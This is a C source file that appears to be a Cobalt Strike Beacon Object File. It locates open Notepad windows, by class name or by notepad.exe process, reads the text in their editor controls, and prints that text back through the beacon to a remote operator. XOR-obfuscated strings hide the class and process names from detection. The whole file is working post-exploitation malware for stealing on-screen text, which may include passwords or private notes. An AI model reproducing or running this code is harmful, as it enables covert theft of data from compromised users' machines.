#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include "beacon.h"

#ifndef WM_GETTEXT
#define WM_GETTEXT 0x000D
#endif

#ifndef WM_GETTEXTLENGTH
#define WM_GETTEXTLENGTH 0x000E
#endif

#ifndef TH32CS_SNAPPROCESS
#define TH32CS_SNAPPROCESS 0x00000002
#endif

#ifndef MEM_COMMIT
#define MEM_COMMIT 0x1000
#endif
#ifndef MEM_RESERVE
#define MEM_RESERVE 0x2000
#endif
#ifndef MEM_RELEASE
#define MEM_RELEASE 0x8000
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE 0x04
#endif

#ifndef PROCESSENTRY32
typedef struct tagPROCESSENTRY32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32;
typedef PROCESSENTRY32 *LPPROCESSENTRY32;
#endif


DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT WINBASEAPI int WINAPI KERNEL32$lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);
DECLSPEC_IMPORT WINBASEAPI int WINAPI KERNEL32$lstrlenA(LPCSTR lpString);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

DECLSPEC_IMPORT WINUSERAPI HWND WINAPI USER32$FindWindowA(LPCSTR lpClassName, LPCSTR lpWindowName);
DECLSPEC_IMPORT WINUSERAPI HWND WINAPI USER32$FindWindowExA(HWND hWndParent, HWND hWndChildAfter, LPCSTR lpszClass, LPCSTR lpszWindow);
DECLSPEC_IMPORT WINUSERAPI LRESULT WINAPI USER32$SendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$IsWindow(HWND hWnd);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$EnumWindows(WNDENUMPROC lpEnumFunc, LPARAM lParam);
DECLSPEC_IMPORT WINUSERAPI int WINAPI USER32$GetClassNameA(HWND hWnd, LPSTR lpClassName, int nMaxCount);
DECLSPEC_IMPORT WINUSERAPI int WINAPI USER32$GetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount);
DECLSPEC_IMPORT WINUSERAPI DWORD WINAPI USER32$GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$IsWindowVisible(HWND hWnd);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$EnumChildWindows(HWND hWndParent, WNDENUMPROC lpEnumFunc, LPARAM lParam);


#define MAX_NOTEPAD_BUFFER 32768
#define MAX_OUTPUT_LENGTH  32000  
#define MAX_NOTEPAD_INSTANCES 16  
#define MAX_TITLE_FILTER 256      


#define STRING_XOR_KEY 0x42



static const unsigned char obf_notepad[] = {0x0C, 0x2D, 0x36, 0x27, 0x32, 0x23, 0x26, 0x00};

static const unsigned char obf_edit[] = {0x07, 0x26, 0x2B, 0x36, 0x00};

static const unsigned char obf_richedit50w[] = {0x10, 0x0B, 0x01, 0x0A, 0x07, 0x06, 0x0B, 0x16, 0x77, 0x72, 0x15, 0x00};

static const unsigned char obf_richedit20w[] = {0x10, 0x2B, 0x21, 0x2A, 0x07, 0x26, 0x2B, 0x36, 0x70, 0x72, 0x15, 0x00};

static const unsigned char obf_richeditd2dpt[] = {0x10, 0x2B, 0x21, 0x2A, 0x07, 0x26, 0x2B, 0x36, 0x06, 0x70, 0x06, 0x12, 0x16, 0x00};

static const unsigned char obf_notepad_exe[] = {0x2C, 0x2D, 0x36, 0x27, 0x32, 0x23, 0x26, 0x6C, 0x27, 0x3A, 0x27, 0x00};


typedef struct {
    HWND windows[MAX_NOTEPAD_INSTANCES];
    int count;
    char titleFilter[MAX_TITLE_FILTER];
    BOOL hasTitleFilter;
} NotepadEnumData;


typedef struct {
    HWND windows[MAX_NOTEPAD_INSTANCES];
    int count;
    DWORD targetPids[16];
    int targetPidCount;
} ProcessEnumData;


#define MAX_CHILD_ENUM 200
#define NUM_EDITOR_CLASSES 4
#define MAX_DEBUG_CLASSES 6
#define MAX_CLASS_NAME_LEN 48

typedef struct {
    HWND hwndBest;
    int bestPriority;
    LRESULT heuristicLen;
    int childCount;
    char knownClasses[NUM_EDITOR_CLASSES][32];
    char debugClasses[MAX_DEBUG_CLASSES][MAX_CLASS_NAME_LEN];
    int debugCount;
} ChildSearchData;


static void* inline_memset(void *dest, int value, size_t count) {
    unsigned char *d = (unsigned char *)dest;
    while (count-- != 0U) {
        *d++ = (unsigned char)value;
    }
    return dest;
}


static void deobfuscate_string(char *dest, const unsigned char *src, int len, char key) {
    int i;
    for (i = 0; i < len && src[i] != 0; i++) {
        dest[i] = (char)(src[i] ^ key);
    }
    dest[i] = '\0';
}


static BOOL stristr(const char *haystack, const char *needle) {
    if (haystack == NULL || needle == NULL) {
        return FALSE;
    }
    
    int haystackLen = KERNEL32$lstrlenA(haystack);
    int needleLen = KERNEL32$lstrlenA(needle);
    
    if (needleLen == 0) {
        return TRUE;
    }
    
    if (needleLen > haystackLen) {
        return FALSE;
    }
    
    int i, j;
    for (i = 0; i <= haystackLen - needleLen; i++) {
        BOOL match = TRUE;
        for (j = 0; j < needleLen; j++) {
            char h = haystack[i + j];
            char n = needle[j];
            
            if (h >= 'A' && h <= 'Z') {
                h = (char)(h + 32);
            }
            if (n >= 'A' && n <= 'Z') {
                n = (char)(n + 32);
            }
            if (h != n) {
                match = FALSE;
                break;
            }
        }
        if (match) {
            return TRUE;
        }
    }
    
    return FALSE;
}


static void safe_strcpy(char *dest, size_t destSize, const char *src) {
    if (dest == NULL || destSize == 0 || src == NULL) {
        if (dest != NULL && destSize > 0) {
            dest[0] = '\0';
        }
        return;
    }

    size_t i = 0;
    while (i < (destSize - 1) && src[i] != '\0') {
        dest[i] = src[i];
        i++;
    }
    dest[i] = '\0';
}


BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    NotepadEnumData *data = (NotepadEnumData *)lParam;
    char className[256];
    char windowTitle[256];
    char deobf_class[256];
    
    if (data == NULL || data->count >= MAX_NOTEPAD_INSTANCES) {
        return FALSE;
    }


    inline_memset(className, 0, sizeof(className));
    inline_memset(windowTitle, 0, sizeof(windowTitle));
    inline_memset(deobf_class, 0, sizeof(deobf_class));


    if (USER32$GetClassNameA(hwnd, className, sizeof(className) - 1) == 0) {
        return TRUE;
    }


    deobfuscate_string(deobf_class, obf_notepad, sizeof(obf_notepad), STRING_XOR_KEY);


    if (KERNEL32$lstrcmpiA(className, deobf_class) != 0) {
        return TRUE;
    }


    if (!USER32$IsWindowVisible(hwnd)) {
        return TRUE;
    }


    USER32$GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle) - 1);


    if (data->hasTitleFilter && data->titleFilter[0] != '\0') {
        if (!stristr(windowTitle, data->titleFilter)) {
            return TRUE;
        }
    }


    data->windows[data->count] = hwnd;
    data->count++;

    return TRUE;
}


BOOL CALLBACK EnumWindowsProcByPid(HWND hwnd, LPARAM lParam) {
    ProcessEnumData *data = (ProcessEnumData *)lParam;
    char className[256];
    char deobf_class[256];
    DWORD windowPid = 0;
    int i;
    BOOL pidMatches = FALSE;
    
    if (data == NULL || data->count >= MAX_NOTEPAD_INSTANCES) {
        return FALSE;
    }


    inline_memset(className, 0, sizeof(className));
    inline_memset(deobf_class, 0, sizeof(deobf_class));


    USER32$GetWindowThreadProcessId(hwnd, &windowPid);


    for (i = 0; i < data->targetPidCount; i++) {
        if (windowPid == data->targetPids[i]) {
            pidMatches = TRUE;
            break;
        }
    }

    if (!pidMatches) {
        return TRUE;
    }


    if (USER32$GetClassNameA(hwnd, className, sizeof(className) - 1) == 0) {
        return TRUE;
    }


    deobfuscate_string(deobf_class, obf_notepad, sizeof(obf_notepad), STRING_XOR_KEY);


    if (KERNEL32$lstrcmpiA(className, deobf_class) != 0) {
        return TRUE;
    }


    if (!USER32$IsWindowVisible(hwnd)) {
        return TRUE;
    }


    data->windows[data->count] = hwnd;
    data->count++;

    return TRUE;
}


static int FindNotepadProcesses(DWORD *pids, int maxPids) {
    HANDLE snapshot = NULL;
    PROCESSENTRY32 pe32;
    int pidCount = 0;
    char deobf_exe[256];
    char processName[256];
    
    if (pids == NULL || maxPids <= 0) {
        return 0;
    }
    
    
    inline_memset(&pe32, 0, sizeof(PROCESSENTRY32));
    pe32.dwSize = sizeof(PROCESSENTRY32);
    inline_memset(deobf_exe, 0, sizeof(deobf_exe));
    
    
    deobfuscate_string(deobf_exe, obf_notepad_exe, sizeof(obf_notepad_exe), STRING_XOR_KEY);
    
    
    snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE || snapshot == NULL) {
        return 0;
    }
    
    
    if (KERNEL32$Process32First(snapshot, &pe32)) {
        do {
            if (pidCount >= maxPids) {
                break;
            }
            
            
            inline_memset(processName, 0, sizeof(processName));
            safe_strcpy(processName, sizeof(processName), pe32.szExeFile);
            
            if (KERNEL32$lstrcmpiA(processName, deobf_exe) == 0) {
                pids[pidCount] = pe32.th32ProcessID;
                pidCount++;
            }
        } while (KERNEL32$Process32Next(snapshot, &pe32) && pidCount < maxPids);
    }
    
    KERNEL32$CloseHandle(snapshot);
    return pidCount;
}


BOOL CALLBACK FindEditorChildProc(HWND hwnd, LPARAM lParam) {
    ChildSearchData *data = (ChildSearchData *)lParam;
    char className[64];
    int i;
    BOOL isKnownClass = FALSE;
    BOOL dup = FALSE;

    if (data == NULL || data->childCount >= MAX_CHILD_ENUM) {
        return FALSE;
    }
    data->childCount++;

    inline_memset(className, 0, sizeof(className));
    if (USER32$GetClassNameA(hwnd, className, sizeof(className) - 1) == 0) {
        return TRUE;
    }

    for (i = 0; i < NUM_EDITOR_CLASSES; i++) {
        if (KERNEL32$lstrcmpiA(className, data->knownClasses[i]) == 0) {
            isKnownClass = TRUE;
            break;
        }
    }

    if (isKnownClass) {
        data->hwndBest = hwnd;
        data->bestPriority = 0;
        return FALSE;
    }

    if (data->bestPriority > 0) {
        LRESULT len = USER32$SendMessageA(hwnd, WM_GETTEXTLENGTH, 0, 0);
        if (len > data->heuristicLen) {
            data->hwndBest = hwnd;
            data->bestPriority = 1;
            data->heuristicLen = len;
        }
    }

    if (data->debugCount < MAX_DEBUG_CLASSES) {
        dup = FALSE;
        for (i = 0; i < data->debugCount; i++) {
            if (KERNEL32$lstrcmpiA(data->debugClasses[i], className) == 0) {
                dup = TRUE;
                break;
            }
        }
        if (!dup) {
            safe_strcpy(data->debugClasses[data->debugCount], MAX_CLASS_NAME_LEN, className);
            data->debugCount++;
        }
    }

    return TRUE;
}


static BOOL extract_notepad_content(HWND hwndNotepad, char *outputBuffer, size_t bufferSize) {
    HWND hwndEdit = NULL;
    LRESULT textLength = 0;
    LRESULT bytesCopied = 0;
    size_t actualSize = 0;
    ChildSearchData searchData;
    int i;
    char matchClass[64];

    if (hwndNotepad == NULL || outputBuffer == NULL || bufferSize == 0) {
        return FALSE;
    }

    if (!USER32$IsWindow(hwndNotepad)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid Notepad window handle\n");
        return FALSE;
    }

    inline_memset(&searchData, 0, sizeof(searchData));
    searchData.bestPriority = 99;

    deobfuscate_string(searchData.knownClasses[0], obf_edit, sizeof(obf_edit), STRING_XOR_KEY);
    deobfuscate_string(searchData.knownClasses[1], obf_richeditd2dpt, sizeof(obf_richeditd2dpt), STRING_XOR_KEY);
    deobfuscate_string(searchData.knownClasses[2], obf_richedit50w, sizeof(obf_richedit50w), STRING_XOR_KEY);
    deobfuscate_string(searchData.knownClasses[3], obf_richedit20w, sizeof(obf_richedit20w), STRING_XOR_KEY);

    USER32$EnumChildWindows(hwndNotepad, FindEditorChildProc, (LPARAM)&searchData);

    hwndEdit = searchData.hwndBest;

    if (hwndEdit == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find text control\n");
        return FALSE;
    }

    if (searchData.bestPriority > 0) {
        inline_memset(matchClass, 0, sizeof(matchClass));
        USER32$GetClassNameA(hwndEdit, matchClass, sizeof(matchClass) - 1);
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Using heuristic match: %s\n", matchClass);
    }

    textLength = USER32$SendMessageA(hwndEdit, WM_GETTEXTLENGTH, 0, 0);
    if (textLength < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get text length from text control\n");
        return FALSE;
    }

    if (textLength == 0) {
        outputBuffer[0] = '\0';
        return TRUE;
    }

    if (textLength > (MAX_NOTEPAD_BUFFER - 1)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Notepad content exceeds maximum size (%lu bytes), truncating to %d bytes\n",
                     (unsigned long)textLength, MAX_NOTEPAD_BUFFER - 1);
        textLength = MAX_NOTEPAD_BUFFER - 1;
    }

    actualSize = (size_t)textLength + 1;
    if (actualSize > bufferSize) {
        actualSize = bufferSize;
    }

    inline_memset(outputBuffer, 0, actualSize);

    bytesCopied = USER32$SendMessageA(hwndEdit, WM_GETTEXT, (WPARAM)actualSize, (LPARAM)outputBuffer);
    if (bytesCopied < 0 || bytesCopied > (LRESULT)actualSize) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve text from text control (bytesCopied: %ld)\n", (long)bytesCopied);
        outputBuffer[0] = '\0';
        return FALSE;
    }

    if ((size_t)bytesCopied >= actualSize) {
        bytesCopied = (LRESULT)(actualSize - 1);
    }
    outputBuffer[bytesCopied] = '\0';

    return TRUE;
}


void go(char *args, unsigned long alen) {
    NotepadEnumData enumData = {0};
    ProcessEnumData processEnumData = {0};
    DWORD notepadPids[16] = {0};
    int notepadPidCount = 0;
    char *contentBuffer = NULL;
    BOOL success = FALSE;
    BOOL usedFallback = FALSE;
    int i;
    datap parser = {0};
    char *titleArg = NULL;


    inline_memset(&enumData, 0, sizeof(enumData));
    inline_memset(&processEnumData, 0, sizeof(processEnumData));
    inline_memset(notepadPids, 0, sizeof(notepadPids));

    contentBuffer = (char *)KERNEL32$VirtualAlloc(NULL, MAX_NOTEPAD_BUFFER, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (contentBuffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for content buffer\n");
        return;
    }
    
    
    if (alen > 0) {
        BeaconDataParse(&parser, args, (int)alen);
        titleArg = BeaconDataExtract(&parser, NULL);
        
        if (titleArg != NULL && titleArg[0] != '\0') {
            enumData.hasTitleFilter = TRUE;
            safe_strcpy(enumData.titleFilter, sizeof(enumData.titleFilter), titleArg);
        }
    }
    
    
    USER32$EnumWindows(EnumWindowsProc, (LPARAM)&enumData);
    
    if (enumData.count == 0) {
        usedFallback = TRUE;
        
        
        notepadPidCount = FindNotepadProcesses(notepadPids, 16);
        
        if (notepadPidCount > 0) {
            
            
            processEnumData.count = 0;
            processEnumData.targetPidCount = notepadPidCount;
            for (i = 0; i < notepadPidCount; i++) {
                processEnumData.targetPids[i] = notepadPids[i];
            }
            
            
            USER32$EnumWindows(EnumWindowsProcByPid, (LPARAM)&processEnumData);
            
            
            if (processEnumData.count > 0) {
                for (i = 0; i < processEnumData.count && enumData.count < MAX_NOTEPAD_INSTANCES; i++) {
                    enumData.windows[enumData.count] = processEnumData.windows[i];
                    enumData.count++;
                }
            }
        }
    }
    
    
    if (enumData.count == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No Notepad windows found\n");
        KERNEL32$VirtualFree(contentBuffer, 0, MEM_RELEASE);
        return;
    }
    
    
    for (i = 0; i < enumData.count; i++) {
        HWND hwnd = enumData.windows[i];
        char windowTitle[256];
        
        if (hwnd == NULL || !USER32$IsWindow(hwnd)) {
            continue;
        }
        
        
        inline_memset(windowTitle, 0, sizeof(windowTitle));
        USER32$GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle) - 1);
        
        if (windowTitle[0] != '\0') {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s\n", windowTitle);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Notepad instance %d\n", i + 1);
        }
        
        
        inline_memset(contentBuffer, 0, MAX_NOTEPAD_BUFFER);


        success = extract_notepad_content(hwnd, contentBuffer, MAX_NOTEPAD_BUFFER);
        if (!success) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to extract content from Notepad instance %d\n", i + 1);
            continue;
        }

        
        if (contentBuffer[0] != '\0') {
            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", contentBuffer);
        }
    }

    KERNEL32$VirtualFree(contentBuffer, 0, MEM_RELEASE);
}
